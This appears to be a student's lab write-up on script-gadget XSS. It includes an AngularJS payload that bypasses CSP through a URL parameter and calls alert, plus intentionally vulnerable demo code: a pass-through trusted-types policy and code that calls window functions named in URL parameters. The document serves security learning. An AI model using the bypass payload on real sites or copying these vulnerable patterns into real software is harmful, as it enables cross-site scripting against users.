# Script Gadgets

## Answers

1. What could you do to mitigate/prevent the attack in the first exercise (Celsius to Fahrenheit Converter). Assume you can modify the application code.
    - Prevent XSS by properly encoding the parameter
    - Try to use CSP trusted types: probably wont work with AngularJS as - my current understanding - the framework has to support it too.
    - Change the framework (ok this would be a rewrite and can we be sure that the other framework doesn't have a vulnerability?)
2. Why does the CSP policy in the second exercise (Build your own script gadget) not prevent the execution of the alert function.
    - The CSP policy prevents inline scripts, eval etc. but I doesn't prevent normal html to be injected (setting innerHtml property). By inserting a "normal" html tag - by itself benign - the framework code in main.js, which listenes to dom changes, in interpretes the user code passed in the url und ultimatly elevates to to code that is executed.


## Steps taken

**Part one**
1. Trying to find XSS vulnerability
    - Celsius textbox  (using browser developer tools, I changed input type to text and could inject code)
        - or just edit url as it is a GET form
    - scripts are not executed due to CSP policy
2. Attack
-> injecting the following code via url parameter:  (url decoded for clarity)

```
<divng-appng-csp>
 <divng-focus="x=$event"id=ftabindex=0>foo</div>
 <divng-repeat="(key,value)inx.view">
   <divng-if=key=="window">{{value.alert=[1].reduce(value.alert,1337)}}</div>
 </div>
</div>

```
AngularJS will interpret the passed data and ultimatly execute the expression upon click.  


**Part 2: my own gadget**

Playing around with some payload (with CSP activated): 

- <div id="expression" data="alert" data-idx="1337">
    - will execute (from task)
- <div id="expression" data="eval" data-idx="'alert(999)'">
    - Will not be executed because of CSP policy (unsafe-eval not allowed).. browser work correctly :-)




## Playing around with trusted types

my CSP policy
`<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; object-src 'none'; require-trusted-types-for 'script'; trusted-types myPol;">`

Bypassing trusted-types and with injected user code 
    - setAttribute is clearly not protected by trusted-types... 
    - this example of a vulnerability is probably not realistic as multiple url parameters have to be set in js code. However, could this still be a vulnerability in some frameworks??? quite a few use attributes...
```
// possible to run script: /gadget.html?inj=div&id=expression&data=alert&idx=999
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);

let appEl = document.getElementById("app");

let newEl = document.createElement(urlParams.get('inj'))
newEl.setAttribute('id', urlParams.get('id'));
newEl.setAttribute('data', urlParams.get('data'));
newEl.setAttribute('data-idx', urlParams.get('idx'));
appEl.appendChild(newEl);


//document.getElementById("app").innerHTML = decodeURIComponent(ref);

document.addEventListener("DOMContentLoaded", function() {         
    if (expr =  document.getElementById("expression")) {
        let data = expr.getAttribute("data");
        let data_idx = expr.getAttribute("data-idx");
        // trick to execute function from string without eval
        var fn = window[data];
        var fnparams = [data_idx];
        if (typeof fn === "function") fn.apply(null, fnparams);
    }
});

```


Writing a useless sanitizer  (of course not a realistic example)
```
let ref=document.location.href.split("?inj=")[1];
let decodedCont = decodeURIComponent(ref);;

const uselessSanitizer = trustedTypes.createPolicy('myPol', {
    createHTML: string => string //string.replace(/</g, '&lz;')
    });
document.getElementById("app").innerHTML = uselessSanitizer.createHTML(decodedCont);

//document.getElementById("app").innerHTML = decodeURIComponent(ref); // code that is not allowed due to trusted types

document.addEventListener("DOMContentLoaded", function() {         
    if (expr =  document.getElementById("expression")) {
        let data = expr.getAttribute("data");
        let data_idx = expr.getAttribute("data-idx");
        // trick to execute function from string without eval
        var fn = window[data];
        var fnparams = [data_idx];
        if (typeof fn === "function") fn.apply(null, fnparams);
    }
});

```